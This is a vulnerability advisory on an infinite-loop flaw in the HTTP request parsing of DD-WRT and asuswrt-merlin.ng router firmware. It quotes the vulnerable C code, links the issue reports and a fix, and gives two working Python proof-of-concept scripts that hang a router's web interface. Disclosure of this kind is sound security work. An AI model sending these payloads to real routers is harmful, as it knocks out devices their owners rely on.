# Logical Vulnerability in DD-WRT/ASUSWRT-Merlin.gn could make http service unreachable

## Vul Description

The httpd in DD-WRT and asuswrt-merlin.gn has a logic vulnerability when parsing the http request. Sending the constructed special data packet can make the http service unreachable.

## Affected version

DD-WRT has fixed the vulnerability in the latest version of the source code

The vulnerability still exists in the latest version of the source code of ASUSWRT-Merlin.gn

## Product link

http://svn.dd-wrt.com/

https://github.com/RMerl/asuswrt-merlin.ng

## Vul Detail: DD-WRT

issue：https://svn.dd-wrt.com/ticket/7029

fix ：https://svn.dd-wrt.com/changeset/42748/src/router/httpd/httpd.c

The vulnerability is in the `handle_request` function in`src/router/httpd/httpd.c`. The code snippet is as follows:

```c
#define LINE_LEN 10000

static void *handle_request(void *arg){
    ...
    char *line;
    line = malloc(LINE_LEN);
    ...
    // http request header: 
    // "GET /url/path HTTP/1.1\r\nHost: 192.168.0.1"
    // protocol --> "HTTP/1.1\r\nHost: 192.168.0.1"
	cp = protocol;
	strsep(&cp, " ");
    // cur --> "192.168.0.1"
	cur = protocol + strlen(protocol) + 1;
	/* Parse the rest of the request headers. */

	while (wfgets(cur, line + LINE_LEN - cur, conn_fp, &eof) != 0)	//jimmy,https,8/4/2003
	{
		if (eof) {
			send_error(conn_fp, 408, "TCP Error", NULL, "Unexpected connection close");
			goto out;
		}
		if (strcmp(cur, "\n") == 0 || strcmp(cur, "\r\n") == 0) {
			break;
		} else if (strncasecmp(cur, "Authorization:", 14) == 0) {
			cp = &cur[14];
			cp += strspn(cp, " \t");
			authorization = cp;
			cur = cp + strlen(cp) + 1;
		} else if (strncasecmp(cur, "Referer:", 8) == 0) {
			cp = &cur[8];
			cp += strspn(cp, " \t");
			referer = cp;
			cur = cp + strlen(cp) + 1;
		} else if (strncasecmp(cur, "Host:", 5) == 0) {
			cp = &cur[5];
			cp += strspn(cp, " \t");
			host = cp;
			cur = cp + strlen(cp) + 1;
		} else if (strncasecmp(cur, "Content-Length:", 15) == 0) {
			cp = &cur[15];
			cp += strspn(cp, " \t");
			content_length = strtoul(cp, NULL, 0);

		} else if ((cp = strstr(cur, "boundary="))) {
			boundary = &cp[9];
			for (cp = cp + 9; *cp && *cp != '\r' && *cp != '\n'; cp++) ;
			*cp = '\0';
			cur = ++cp;
		}
#ifdef HAVE_IAS
		else if (strncasecmp(cur, "User-Agent:", 11) == 0) {
			cp = &cur[11];
			cp += strspn(cp, " \t");
			useragent = cp;
			cur = cp + strlen(cp) + 1;
		} else if (strncasecmp(cur, "Accept-Language:", 16) == 0) {
			cp = &cur[17];
			cp += strspn(cp, " \t");
			language = cp;
			cur = cp + strlen(cp) + 1;
		}
#endif
	}
    ...
}
```

The characteristics of the wfgets(): if the value of the second parameter of the function is 1, then wfgets will not read data from stream(conn_fp), but the returned is still a normal pointer (cur address). The first byte of the pointer to memory will be set to `\x00`.

The cur's value is calculated by `protocol + strlen(protocol) + 1;`, if we construct data packet such as `'GET /uri' + 'a' * (LINE_LEN-3-9) + '\n' + 'bbbbb'` , then, `cur = protocol + strlen (protocol) + 1` will point to the address of` line + LINE_LEN-1`. Therefore, the second parameter of wfgets `line + LINE_LEN-cur` will be 1, and there is no handling of abnormal conditions such as `cur -> '\ x00'` in the while loop, so the program will fall into an infinite loop.

poc is as follows：

```python
import socket

LINE_LEN = 10000
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.144", 80))
start = 'GET /uri '
payload = start+'a'*(LINE_LEN-3-(len(start)))+'\n'+'b'*30
s.send(payload)
print(s.recv(1024))
s.close()
```

![](https://raw.githubusercontent.com/e3pem/mdimage/master/img/poc.png)


## Vul Detail: asuswrt-merlin.gn

issue： https://github.com/RMerl/asuswrt-merlin.ng/issues/456

The vulnerability is in the `handle_request` function in`release/src/router/httpd/httpd.c`. The code snippet is similar to `DD-WRT`, as shown below:


```c
handle_request(void){
    char line[10000], *cur;
    ...
    cur = protocol + strlen(protocol) + 1;

#ifdef TRANSLATE_ON_FLY
	memset(Accept_Language, 0, sizeof(Accept_Language));
#endif

	/* Parse the rest of the request headers. */
	while ( fgets( cur, line + sizeof(line) - cur, conn_fp ) != (char*) 0 )
	{
		//_dprintf("handle_request:cur = %s\n",cur);
		if ( strcmp( cur, "\n" ) == 0 || strcmp( cur, "\r\n" ) == 0 ) {
			break;
		}
        else if ( strncasecmp( cur, "Accept-Language:", 16) == 0 ) {
            ...
        }
        else if ( strncasecmp( cur, "Authorization:", 14 ) == 0 ){
            ...
        }
        else if ( strncasecmp( cur, "User-Agent:", 11 ) == 0 ){
            ...
        }
        else if ( strncasecmp( cur, "Cookie:", 7 ) == 0 ){
            ...
        }
        else if ( strncasecmp( cur, "Referer:", 8 ) == 0 ){
            ...
        }
        else if ( strncasecmp( cur, "Host:", 5 ) == 0 ){
            ...
        }
        else if (strncasecmp( cur, "Content-Length:", 15 ) == 0) {
            ...
        }
        else if ((cp = strstr( cur, "boundary=" ))) {
            ...
        }
    }
}
```

Constructing a proper malformed data packet can make `line + sizeof(line)-cur = 1`, and the program will fall into an infinite loop:

poc is as follows：

```python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.1", 80))
start = 'GET /uri '
payload = start+'a'*(10000-3-(len(start)))+'\n'+'b'*30
s.send(payload)
print(s.recv(1024))
s.close()
```

